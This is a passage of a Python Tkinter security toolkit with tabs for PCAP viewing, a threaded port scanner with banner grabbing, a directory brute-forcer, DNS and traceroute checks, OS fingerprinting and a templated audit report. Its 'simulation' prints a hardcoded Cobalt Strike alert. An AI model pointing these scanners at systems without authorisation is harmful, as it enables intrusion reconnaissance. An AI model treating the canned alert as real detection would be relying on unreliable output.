        tk.Button(ctrl, text="🧪 Run Simulation", command=self.run_pcap_sim, bg='#238636', foreground='white').pack(
            side='left')

        self.pcap_out = scrolledtext.ScrolledText(tab, bg='#0d1117', foreground='#e6edf3', font=('Consolas', 10))
        self.pcap_out.pack(fill='both', expand=True, padx=20, pady=10)

    def load_pcap_file(self):
        path = filedialog.askopenfilename(filetypes=[("PCAP files", "*.pcap;*.pcapng")])
        if path:
            threading.Thread(target=self._pcap_logic, args=(path,), daemon=True).start()

    def _pcap_logic(self, path):
        self.pcap_out.delete(1.0, tk.END)
        self.log(f"Analyzing PCAP: {path}...", self.pcap_out, "PCAP_Analysis")
        try:
            pkts = rdpcap(path)
            self.pcap_out.insert(tk.END, f"Total Packets: {len(pkts)}\n")
            for p in pkts[:100]:
                self.pcap_out.insert(tk.END, f"{p.summary()}\n")
        except Exception as e:
            self.pcap_out.insert(tk.END, f"❌ Error: {e}\n")

    def run_pcap_sim(self):
        self.pcap_out.delete(1.0, tk.END)

        def run_sim():
            self.log("Starting Offline PCAP Simulation...", self.pcap_out)
            time.sleep(1)
            self.pcap_out.insert(tk.END, "[+] Loading virtual interface...\n")
            time.sleep(0.5)
            self.pcap_out.insert(tk.END, "[+] Replaying traffic from 'malware_sample_2024.pcap'...\n", "warning")
            time.sleep(1)
            self.pcap_out.insert(tk.END, "🚨 ALERT: Found Cobalt Strike Beaconing pattern!\n", "critical")
            self.pcap_out.insert(tk.END, "   - Target: 185.25.10.44\n")
            self.pcap_out.insert(tk.END, "   - Protocol: HTTP/S over Port 443\n")
            self.pcap_out.insert(tk.END, "   - Confidence: 98%\n", "critical")
            self.pcap_out.insert(tk.END, "✅ Simulation Finished. 1 Critical Threat Identified.\n", "success")

        self.pcap_out.tag_config("critical", foreground="#ff7b72", font=('Consolas', 10, 'bold'))
        self.pcap_out.tag_config("success", foreground="#7ee787", font=('Consolas', 10, 'bold'))
        threading.Thread(target=run_sim, daemon=True).start()

    # ================= 10. ADVANCED PORT SCANNER (ENHANCED) =================
    def setup_advanced_scan_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🎯 Port Scanner")

        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=15)

        tk.Label(ctrl, text="Target IP:", bg='#161b22', foreground='white').pack(side='left', padx=5)
        self.scan_ip = tk.Entry(ctrl, width=15, bg='#21262d', foreground='white')
        self.scan_ip.pack(side='left', padx=5)
        self.scan_ip.insert(0, "127.0.0.1")

        # إضافة خيارات الفحص المتعددة
        tk.Label(ctrl, text="Scan Mode:", bg='#161b22', foreground='white').pack(side='left', padx=5)
        self.scan_mode = ttk.Combobox(ctrl, values=["Top 1000", "Full Scan (65535)", "Custom Range"], width=15)
        self.scan_mode.pack(side='left', padx=5)
        self.scan_mode.set("Top 1000")
        self.scan_mode.bind("<<ComboboxSelected>>", self.on_scan_mode_change)

        self.custom_range_frame = tk.Frame(ctrl, bg='#161b22')
        tk.Label(self.custom_range_frame, text="Range:", bg='#161b22', foreground='white').pack(side='left', padx=2)
        self.scan_range_start = tk.Entry(self.custom_range_frame, width=6, bg='#21262d', foreground='white')
        self.scan_range_start.pack(side='left', padx=2)
        self.scan_range_start.insert(0, "1")
        tk.Label(self.custom_range_frame, text="-", bg='#161b22', foreground='white').pack(side='left')
        self.scan_range_end = tk.Entry(self.custom_range_frame, width=6, bg='#21262d', foreground='white')
        self.scan_range_end.pack(side='left', padx=2)
        self.scan_range_end.insert(0, "1024")

        tk.Button(ctrl, text="🚀 START SCAN", command=self.run_scan, bg='#1f6feb', foreground='white',
                  font=('Segoe UI', 9, 'bold')).pack(side='left', padx=15)

        self.scan_tree = ttk.Treeview(tab, columns=("Port", "State", "Service", "Banner"), show='headings')
        for col in ("Port", "State", "Service", "Banner"):
            self.scan_tree.heading(col, text=col)
            self.scan_tree.column(col, width=150)
        self.scan_tree.pack(fill='both', expand=True, padx=20, pady=10)

    def on_scan_mode_change(self, event):
        if self.scan_mode.get() == "Custom Range":
            self.custom_range_frame.pack(side='left', padx=5)
        else:
            self.custom_range_frame.pack_forget()

    def run_scan(self):
        target = self.scan_ip.get()
        mode = self.scan_mode.get()
        for i in self.scan_tree.get_children(): self.scan_tree.delete(i)

        ports = []
        if mode == "Top 1000":
            # قائمة بأشهر 1000 منفذ (محاكاة)
            ports = [20, 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900,
                     8080]
            ports.extend(range(1025, 1100))  # إضافة المزيد لزيادة العدد
        elif mode == "Full Scan (65535)":
            ports = range(1, 65536)
        else:
            try:
                start = int(self.scan_range_start.get())
                end = int(self.scan_range_end.get())
                ports = range(start, end + 1)
            except:
                messagebox.showerror("Error", "Invalid range format")
                return

        threading.Thread(target=self._scan_logic, args=(target, ports), daemon=True).start()

    def _scan_logic(self, target, ports):
        self.log(f"Starting {self.scan_mode.get()} on {target}...", None, "Port_Scan")

        def scan_single(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                result = s.connect_ex((target, port))

                if result == 0:
                    banner = "No Banner"
                    # Smart Banner Grabbing
                    try:
                        if port in [80, 8080, 443]:
                            s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                        else:
                            s.send(b'\r\n')
                        banner_data = s.recv(1024).decode('utf-8', 'ignore').strip()
                        if banner_data:
                            banner = banner_data.split('\n')[0][:50]
                    except:
                        pass

                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "Unknown"

                    self.root.after(0, lambda: self.scan_tree.insert('', 'end', values=(port, "OPEN", service, banner)))
                    self.global_logs["Port_Scan"].append(f"Port {port} ({service}) is OPEN. Banner: {banner}")
                s.close()
            except:
                pass

        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(scan_single, ports)
        self.log(f"Scan completed for {target}", None, "Port_Scan")

    # ================= 11. URL INVESTIGATOR =================
    def setup_url_investigator_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🔍 URL Info")
        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=15)
        tk.Label(ctrl, text="Domain:", bg='#161b22', foreground='white').pack(side='left')
        self.url_inv_entry = tk.Entry(ctrl, width=40, bg='#21262d', foreground='white')
        self.url_inv_entry.pack(side='left', padx=10)
        tk.Button(ctrl, text="🕵️ Investigate", command=self.run_url_investigation, bg='#1f6feb',
                  foreground='white').pack(side='left')
        self.url_inv_out = scrolledtext.ScrolledText(tab, bg='#0d1117', foreground='#e6edf3', font=('Consolas', 11))
        self.url_inv_out.pack(fill='both', expand=True, padx=20, pady=10)

    def run_url_investigation(self):
        target = self.url_inv_entry.get().replace('http://', '').replace('https://', '').split('/')[0]
        if not target: return
        threading.Thread(target=self._url_investigation_thread, args=(target,), daemon=True).start()

    def _url_investigation_thread(self, target):
        self.url_inv_out.delete(1.0, tk.END)
        self.log(f"Investigating {target}...", self.url_inv_out, "URL_Investigator")
        try:
            ip = socket.gethostbyname(target)
            self.url_inv_out.insert(tk.END, f"🌐 IP Address: {ip}\n")
            self.url_inv_out.insert(tk.END, f"🧬 DNS Records (A):\n   {target} -> {ip}\n")
            self.log_comparison(target, "OSINT", f"Resolved to {ip}")
        except Exception as e:
            self.url_inv_out.insert(tk.END, f"❌ Error: {e}\n")

    # ================= 12. DIRECTORY BRUTE FORCE (FULL LIST) =================
    def setup_dir_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="📁 Dir Brute")

        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=10)

        self.dir_url = tk.Entry(ctrl, width=40, bg='#21262d', foreground='white')
        self.dir_url.pack(side='left', padx=10)
        self.dir_url.insert(0, "http://127.0.0.1")

        tk.Button(ctrl, text="📂 Load Wordlist", command=self.load_wordlist, bg='#1f6feb', foreground='white').pack(
            side='left', padx=5)
        self.btn_brute = tk.Button(ctrl, text="💥 Start Brute", command=self.toggle_brute, bg='#da3633',
                                   foreground='white')
        self.btn_brute.pack(side='left')

        self.dir_prog = ttk.Progressbar(tab, length=100, mode='determinate')
        self.dir_prog.pack(fill='x', padx=20, pady=5)

        self.dir_out = scrolledtext.ScrolledText(tab, bg='#0d1117', foreground='#58a6ff')
        self.dir_out.pack(fill='both', expand=True, padx=20, pady=10)

    def load_wordlist(self):
        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if path:
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.custom_wordlist = [line.strip() for line in f if line.strip()]
                messagebox.showinfo("Loaded", f"Loaded {len(self.custom_wordlist)} words successfully.")
            except Exception as e:
                messagebox.showerror("Error", f"Failed: {e}")

    def toggle_brute(self):
        if not self.brute_running:
            self.brute_running = True
            self.btn_brute.config(text="🛑 Stop Brute")
            threading.Thread(target=self._brute_logic, args=(self.dir_url.get().rstrip('/'),), daemon=True).start()
        else:
            self.brute_running = False
            self.btn_brute.config(text="💥 Start Brute")

    def _brute_logic(self, base_url):
        dirs = self.custom_wordlist if self.custom_wordlist else ['admin', 'login', 'robot.txt', 'dashboard']
        self.dir_prog['maximum'] = len(dirs)
        self.dir_out.delete(1.0, tk.END)
        self.log(f"🚀 Starting Brute Force on {base_url} | Wordlist Size: {len(dirs)}", self.dir_out)

        def check_path(d):
            if not self.brute_running: return
            try:
                full_url = f"{base_url}/{d}"
                r = requests.get(full_url, timeout=3, allow_redirects=False)
                if r.status_code in [200, 301, 302, 403]:
                    self.log(f"[FOUND] {r.status_code} - {full_url}", self.dir_out)
            except:
                pass

        with ThreadPoolExecutor(max_workers=20) as executor:
            for i, d in enumerate(dirs):
                if not self.brute_running: break
                executor.submit(check_path, d)
                if i % 5 == 0: self.dir_prog['value'] = i + 1

        self.dir_prog['value'] = len(dirs)
        self.brute_running = False
        self.btn_brute.config(text="💥 Start Brute")
        self.log("🏁 Brute Force Finished.", self.dir_out)

    # ================= 13. HASH CALCULATOR =================
    def setup_hash_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🔑 Hash Calc")
        tk.Button(tab, text="📁 Select File", command=self.hash_file, bg='#1f6feb', foreground='white').pack(pady=20)
        self.hash_output = scrolledtext.ScrolledText(tab, bg='#0d1117', foreground='#58a6ff', font=('Consolas', 11))
        self.hash_output.pack(fill='both', expand=True, padx=20, pady=20)

    def hash_file(self):
        path = filedialog.askopenfilename()
        if not path: return
        try:
            md5, sha1, sha256 = hashlib.md5(), hashlib.sha1(), hashlib.sha256()
            with open(path, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    md5.update(chunk);
                    sha1.update(chunk);
                    sha256.update(chunk)
            res = f"File: {os.path.basename(path)}\nMD5: {md5.hexdigest()}\nSHA1: {sha1.hexdigest()}\nSHA256: {sha256.hexdigest()}\n\n"
            self.hash_output.insert(tk.END, res)
        except:
            pass

    # ================= 14. ACADEMIC REPORTING SYSTEM (ENHANCED) =================
    def setup_report_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="📊 Academic Report")

        btn_frame = tk.Frame(tab, bg='#161b22')
        btn_frame.pack(fill='x', padx=20, pady=10)

        tk.Button(btn_frame, text="🎓 Generate Academic Report", command=self.generate_academic_report, bg='#238636',
                  foreground='white', font=('Segoe UI', 10, 'bold')).pack(side='left', padx=10)
        tk.Button(btn_frame, text="💾 Export to Text", command=self.export_report_to_file, bg='#1f6feb',
                  foreground='white').pack(side='left', padx=10)

        self.rep_out = scrolledtext.ScrolledText(tab, bg='white', foreground='#1c2128', font=('Times New Roman', 12),
                                                 padx=20, pady=20)
        self.rep_out.pack(fill='both', expand=True, padx=20, pady=10)

    def generate_academic_report(self):
        self.rep_out.delete(1.0, tk.END)

        report_title = "CYBERSECURITY AUDIT AND THREAT INTELLIGENCE REPORT"
        date_str = datetime.now().strftime('%B %d, %Y')

        report = f"""
{'=' * 80}
{report_title.center(80)}
{'=' * 80}
Date: {date_str}
Prepared by: CyberForge Pro v14.0 - Autonomous Security System

1. EXECUTIVE SUMMARY
--------------------
This document provides a comprehensive security assessment conducted by the CyberForge Pro platform. 
The audit encompasses network traffic analysis, port vulnerability scanning, HTTP security header 
evaluation, and threat intelligence correlation. 

Summary Statistics:
- Total Packets Captured: {self.capture_packets}
- Threat Intelligence Matches: {self.matched_iocs}
- Vulnerabilities Identified: {len(self.global_logs['HTTP_Analysis']) + len(self.global_logs['Network_Threats'])}

2. METHODOLOGY
--------------
The assessment followed a multi-layered security auditing framework:
A. Reconnaissance: Active port scanning and service identification using Banner Grabbing.
B. Vulnerability Analysis: Passive analysis of HTTP response headers and log pattern matching.
C. Network Monitoring: Real-time packet inspection and Intrusion Detection (IDS) signatures.
D. Threat Correlation: Cross-referencing findings with global Threat Intelligence databases.

3. DETAILED FINDINGS
--------------------

3.1 Network Infrastructure & Port Scanning
{self.format_academic_logs("Port_Scan")}

3.2 Web Security & HTTP Analysis
{self.format_academic_logs("HTTP_Analysis")}

3.3 Intrusion Detection & Network Threats
{self.format_academic_logs("Network_Threats")}

3.4 Directory Enumeration & OSINT
{self.format_academic_logs("Dir_Brute")}
{self.format_academic_logs("URL_Investigator")}

4. RISK ASSESSMENT & CVE MAPPING
--------------------------------
Based on the findings, the following CVEs and CWEs may be applicable to the target environment:
- Missing Security Headers: Related to CWE-693 (Protection Mechanism Failure)
- Open Services: Potential exposure to {", ".join(self.cve_db['RCE'][:2])}

5. RECOMMENDATIONS
------------------
1. Immediate Remediation: Close all unnecessary ports identified in Section 3.1.
2. Web Hardening: Implement missing security headers (CSP, HSTS) to mitigate XSS and MitM attacks.
3. Continuous Monitoring: Enable persistent IDS logging to detect early-stage reconnaissance.
4. Patch Management: Update services associated with the identified banners to their latest versions.

{'=' * 80}
END OF REPORT
{'=' * 80}
"""
        self.rep_out.insert(tk.END, report)

    def format_academic_logs(self, category):
        logs = self.global_logs.get(category, [])
        if not logs: return "   > No significant anomalies or data recorded in this category."
        return "\n".join([f"   [+] {l}" for l in logs])

    def export_report_to_file(self):
        self.generate_academic_report()
        content = self.rep_out.get(1.0, tk.END)
        path = filedialog.asksaveasfilename(defaultextension=".txt")
        if path:
            with open(path, "w", encoding="utf-8") as f: f.write(content)

    # ================= HELPERS =================
    def log(self, msg, widget, category=None):
        if hasattr(widget, 'insert'):
            timestamp = datetime.now().strftime('%H:%M:%S')
            self.root.after(0, lambda: widget.insert(tk.END, f"[{timestamp}] {msg}\n"))
            self.root.after(0, lambda: widget.see(tk.END))
        if category and category in self.global_logs:
            self.global_logs[category].append(msg)

    def log_comparison(self, val, source, result):
        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()
        cur.execute("INSERT INTO comparison_log (timestamp, captured_value, intel_match, result) VALUES (?,?,?,?)",
                    (datetime.now().strftime('%H:%M:%S'), val, source, result))
        conn.commit()
        conn.close()
        # تحديث فوري للواجهة
        self.root.after(0, self.refresh_comparison_db)

    def update_stats(self):
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute("SELECT COUNT(*) FROM threat_intel")
            cnt = cur.fetchone()[0]
            self.total_iocs = cnt
            self.lbl_iocs.config(text=f"IOCs: {cnt}")
            self.var_iocs.set(str(cnt))
            conn.close()
        except:
            pass

    def update_system_monitor(self):
        if PSUTIL_AVAILABLE:
            try:
                cpu, ram = psutil.cpu_percent(), psutil.virtual_memory().percent
                self.sys_mon_lbl.config(text=f"CPU: {cpu}% | RAM: {ram}%")
            except:
                pass
        self.root.after(2000, self.update_system_monitor)

    # =============================================================================
    # ORIGINAL CODE END (DO NOT MODIFY ANY LINE ABOVE)
    # =============================================================================

    # =============================================================================
    # EXTENSIONS (ADDED AS NEW METHODS TO THE CLASS WITHOUT MODIFYING ORIGINAL ONES)
    # =============================================================================
    def init_extensions(self):
        """تهيئة الإضافات الجديدة"""
        # إضافة السجلات الجديدة
        self.global_logs["Traceroute"] = []
        self.global_logs["DNS_Audit"] = []

        # إضافة التبويبات الجديدة
        self.setup_traceroute_tab()
        self.setup_dns_audit_tab()
        self.setup_os_detect_tab()

    def setup_traceroute_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🛣️ Traceroute")
        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=15)
        tk.Label(ctrl, text="Target Host:", bg='#161b22', foreground='white').pack(side='left', padx=10)
        self.trace_entry = tk.Entry(ctrl, width=40, bg='#21262d', foreground='white')
        self.trace_entry.pack(side='left', padx=10)
        self.trace_entry.insert(0, "8.8.8.8")
        tk.Button(ctrl, text="🚀 Run Traceroute", command=self.run_traceroute, bg='#1f6feb', foreground='white').pack(
            side='left')

        self.trace_out = scrolledtext.ScrolledText(tab, bg='#0d1117', foreground='#e6edf3', font=('Consolas', 11))
        self.trace_out.pack(fill='both', expand=True, padx=20, pady=10)

    def run_traceroute(self):
        target = self.trace_entry.get()
        if not target: return
        threading.Thread(target=self._traceroute_logic, args=(target,), daemon=True).start()

    def _traceroute_logic(self, target):
        self.trace_out.delete(1.0, tk.END)
        self.log(f"Starting Traceroute to {target}...", self.trace_out, "Traceroute")
        try:
            for ttl in range(1, 31):
                pkt = IP(dst=target, ttl=ttl) / ICMP()
                reply = sr1(pkt, verbose=0, timeout=2)
                if reply is None:
                    self.trace_out.insert(tk.END, f"{ttl}\t*\tRequest timed out.\n")
                elif reply.type == 3:
                    self.trace_out.insert(tk.END, f"{ttl}\t{reply.src}\tReached Target\n")
                    break
                else:
                    self.trace_out.insert(tk.END, f"{ttl}\t{reply.src}\n")
                    if reply.src == target:
                        break
            self.log("Traceroute finished.", self.trace_out)
        except Exception as e:
            self.trace_out.insert(tk.END, f"❌ Error: {e}\n")

    def setup_dns_audit_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🧬 DNS Audit")
        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=15)
        tk.Label(ctrl, text="Domain:", bg='#161b22', foreground='white').pack(side='left', padx=10)
        self.dns_entry = tk.Entry(ctrl, width=40, bg='#21262d', foreground='white')
        self.dns_entry.pack(side='left', padx=10)
        self.dns_entry.insert(0, "google.com")
        tk.Button(ctrl, text="🔍 Extract & Check DNS", command=self.run_dns_audit, bg='#238636',
                  foreground='white').pack(side='left')

        self.dns_out = scrolledtext.ScrolledText(tab, bg='#0d1117', foreground='#e6edf3', font=('Consolas', 11))
        self.dns_out.pack(fill='both', expand=True, padx=20, pady=10)

    def run_dns_audit(self):
        domain = self.dns_entry.get()
        if not domain: return
        threading.Thread(target=self._dns_audit_logic, args=(domain,), daemon=True).start()

    def _dns_audit_logic(self, domain):
        self.dns_out.delete(1.0, tk.END)
        self.log(f"Auditing DNS for {domain}...", self.dns_out, "DNS_Audit")
        if not DNS_AVAILABLE:
            self.dns_out.insert(tk.END, "❌ Error: dnspython library not installed.\n")
            return

        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']
        for r_type in record_types:
            try:
                resolver = dns.resolver.Resolver()
                resolver.timeout = 5
                resolver.lifetime = 5
                answers = resolver.resolve(domain, r_type)
                self.dns_out.insert(tk.END, f"\n[+] {r_type} Records:\n")
                for rdata in answers:
                    self.dns_out.insert(tk.END, f"    - {rdata}\n")
            except Exception as e:
                self.dns_out.insert(tk.END, f"\n[-] {r_type} Records: Not found or error\n")

        # DNS Security Check
        self.dns_out.insert(tk.END, "\n🛡️ DNS SECURITY CHECK:\n")
        try:
            dns.resolver.resolve(f"_dmarc.{domain}", 'TXT')
            self.dns_out.insert(tk.END, "✅ DMARC Record: Found\n")
        except:
            self.dns_out.insert(tk.END, "❌ DMARC Record: MISSING (Risk of Email Spoofing)\n")

        self.log("DNS Audit complete.", self.dns_out)

    def setup_os_detect_tab(self):
        """إضافة تبويب OS Detect مستقل لضمان عدم تعديل واجهة Port Scanner الأصلية"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🖥️ OS Detect")

        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=15)
        tk.Label(ctrl, text="Target IP:", bg='#161b22', foreground='white').pack(side='left', padx=10)
        self.os_ip_entry = tk.Entry(ctrl, width=30, bg='#21262d', foreground='white')
        self.os_ip_entry.pack(side='left', padx=10)
        self.os_ip_entry.insert(0, "127.0.0.1")
        tk.Button(ctrl, text="🔍 Detect OS", command=self.run_os_detection, bg='#1f6feb', foreground='white').pack(
            side='left')

        self.os_out = scrolledtext.ScrolledText(tab, bg='#0d1117', foreground='#58a6ff', font=('Consolas', 11))
        self.os_out.pack(fill='both', expand=True, padx=20, pady=10)

    def run_os_detection(self):
        target = self.os_ip_entry.get()
        if not target: return
        threading.Thread(target=self._os_detection_logic, args=(target,), daemon=True).start()

    def _os_detection_logic(self, target):
        self.os_out.delete(1.0, tk.END)
        self.log(f"Analyzing OS for {target} via TTL Fingerprinting...", self.os_out)
        try:
            pkt = sr1(IP(dst=target) / ICMP(), timeout=2, verbose=0)
            if pkt:
                ttl = pkt.getlayer(IP).ttl
                if ttl <= 64:
                    os_guess = "Linux/Unix"
                elif ttl <= 128:
                    os_guess = "Windows"
                else:
                    os_guess = "Solaris/Cisco"
                self.os_out.insert(tk.END, f"\n[+] TTL Value: {ttl}\n")
                self.os_out.insert(tk.END, f"[+] Predicted OS: {os_guess}\n")
                self.os_out.insert(tk.END, f"\nNote: TTL-based detection is a heuristic and may be affected by hops.\n")
            else:
                self.os_out.insert(tk.END, "❌ No ICMP response from target. OS detection failed.\n")
        except Exception as e:
            self.os_out.insert(tk.END, f"❌ Error: {e}\n")


if __name__ == "__main__":
    root = tk.Tk()
    app = CyberForgePro(root)
    root.mainloop()